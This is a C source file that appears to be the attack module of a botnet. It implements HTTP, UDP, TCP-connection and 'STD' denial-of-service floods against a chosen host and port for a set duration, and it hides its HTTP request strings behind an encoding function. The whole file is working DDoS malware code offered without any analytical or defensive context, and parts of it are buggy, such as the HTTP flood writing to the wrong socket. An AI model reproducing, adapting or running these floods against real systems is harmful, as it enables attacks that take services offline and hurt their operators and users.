#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>

#define PHI 0x9e3779b9

typedef uint32_t ipv4_t;
typedef uint16_t port_t;
static uint32_t Q[4096], c = 362436;

void atkrnd_init(uint32_t x)
{
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++)
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t randoimiser(void)
{
  uint64_t t, a = 18782LL;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (uint32_t)(t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}

void return_random(unsigned char *buf, int length)
{
  int i = 0;
  for(i = 0; i < length; i++)
    buf[i] = (randoimiser()%(91 - 65)) + 65;
}

int return_ipv4(unsigned char *toGet, struct in_addr *i)
{
  struct hostent *h;

  if((i->s_addr = inet_addr(toGet)) == -1)
    return 1;

  return 0;
}

int create_tmp_socket(char *host, in_port_t port) {
  struct hostent * hp;
  struct sockaddr_in addr;
  int on = 1, sock;

  if ((hp = gethostbyname(host)) == NULL)
    return 0;

  bcopy(hp->h_addr, & addr.sin_addr, hp->h_length);
  addr.sin_port = htons(port);
  addr.sin_family = AF_INET;
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char * ) & on, sizeof(int));

  if (sock == -1)
    return 0;

  if (connect(sock, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1)
    return 0;

  return sock;
}

void ddos_flood_http(char *host, in_port_t port, char *path, int attack_duration) {
#ifdef DEBUG
  printf("dbg: http flood, attacking http://%s:%d/%s for %d seconds\n", host, port, path, attack_duration);
#endif
	int i = 0, end_after = time(NULL) + attack_duration, on = 1, sock;
  struct hostent *hp;
  struct sockaddr_in addr;

  if((hp = gethostbyname(host)) == NULL)
    exit(1);

  bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
  addr.sin_port = htons(port);
  addr.sin_family = AF_INET;
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

  if(sock == -1)
    exit(1);

	for (i = 0; i < 10; i++) {
    char request[512];
		strcpy(request, encryption_decode(10, NULL));
    strcat(request, " / ");
    strcat(request, encryption_decode(11, NULL));
    strcat(request, "/");
    strcat(request, encryption_decode(12, NULL));
    strcat(request, "\r\n");
    strcat(request, encryption_decode(13, NULL));
    strcat(request, ": ");
    strcat(request, host);
    strcat(request, "\r\n");
    strcat(request, encryption_decode(14, NULL));
    strcat(request, ": ");
    strcat(request, encryption_decode(15, NULL));
    strcat(request, "\r\n");
    strcat(request, "\r\n");

#ifdef DEBUG
    printf("dbg: build http request\r\n%s", request);
#endif

		while(end_after > time(NULL)) {
      if(create_tmp_socket(host,port) != 0) {
        write(sock, request, strlen(request));
        close(sock);
      }
		}
    close(sock);
		exit(0);
	}
}

void ddos_flood_udp(unsigned char *target, int port, int attack_duration)
{
#ifdef DEBUG
  printf("dbg: udp flood, attacking %s:%d for %d seconds\n", target, port, attack_duration);
#endif
  int packetsize = 512, pollinterval = 10;
  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;

  if(port == 0)
    dest_addr.sin_port = randoimiser();
  else
    dest_addr.sin_port = htons(port);

  if(return_ipv4(target, &dest_addr.sin_addr))
    return;

  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
  register unsigned int pollRegister;
  pollRegister = pollinterval;

  int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(!sockfd)
  {
    return;
  }

  unsigned char *buf = (unsigned char *)malloc(packetsize + 1);

  if(buf == NULL)
    return;

  memset(buf, 0, packetsize + 1);
  return_random(buf, packetsize);

  int end = time(NULL) + attack_duration;
  register unsigned int i = 0;

  while(1)
  {
    sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

    if(i == pollRegister)
    {
      if(port == 0)
        dest_addr.sin_port = randoimiser();

      if(time(NULL) > end)
        break;

      i = 0;
      continue;
    }
    i++;
  }
}

void ddos_flood_tcp(unsigned char *ip, int port, int end_time)
{
  int max = getdtablesize() / 2, i;
  struct sockaddr_in dest_addr;
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = htons(port);

  if(return_ipv4(ip, &dest_addr.sin_addr))
    return;

  memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

  struct state_t {
    int fd;
    uint8_t state;
  } fds[max];

  memset(fds, 0, max * (sizeof(int) + 1));

  fd_set myset;
  struct timeval tv;
  socklen_t lon;
  int valopt, res;

  int end = time(NULL) + end_time;
  while(end > time(NULL)) {
    for(i = 0; i < max; i++) {
      switch(fds[i].state) {
        case 0: {
          fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
          fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
          if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
          else fds[i].state = 1;
        }
        break;
        case 1: {
          FD_ZERO(&myset);
          FD_SET(fds[i].fd, &myset);
          tv.tv_sec = 0;
          tv.tv_usec = 10000;
          res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
          if(res == 1) {
            lon = sizeof(int);
            getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
            if(valopt) {
              close(fds[i].fd);
              fds[i].state = 0;
            } else {
              fds[i].state = 2;
            }
          } else if(res == -1)
          {
            close(fds[i].fd);
            fds[i].state = 0;
          }
        }
        break;
        case 2: {
          FD_ZERO(&myset);
          FD_SET(fds[i].fd, &myset);
          tv.tv_sec = 0;
          tv.tv_usec = 10000;
          res = select(fds[i].fd+1, NULL, NULL, &myset, &tv);
          if(res != 0) {
            close(fds[i].fd);
            fds[i].state = 0;
          }
        }
        break;
      }
    }
  }
}

void ddos_flood_std(unsigned char *ip, int port, int secs) {
  int std_socket, packetsize = 512;
  std_socket = socket(AF_INET, SOCK_DGRAM, 0);
  time_t start = time(NULL);
  struct sockaddr_in sin;
  struct hostent *hp;
  hp = gethostbyname(ip);
  bzero((char*) &sin,sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = port;
  int i = 0;
  unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
  while(1) {
    return_random(buf, packetsize);
    send(std_socket, buf, packetsize, 0);
    connect(std_socket,(struct sockaddr *) &sin, sizeof(sin));
    if (i >= 100) {
      if (time(NULL) >= start+secs) {
        break;
      } else {
        i=0;
      }
    }
    i++;
  }
}
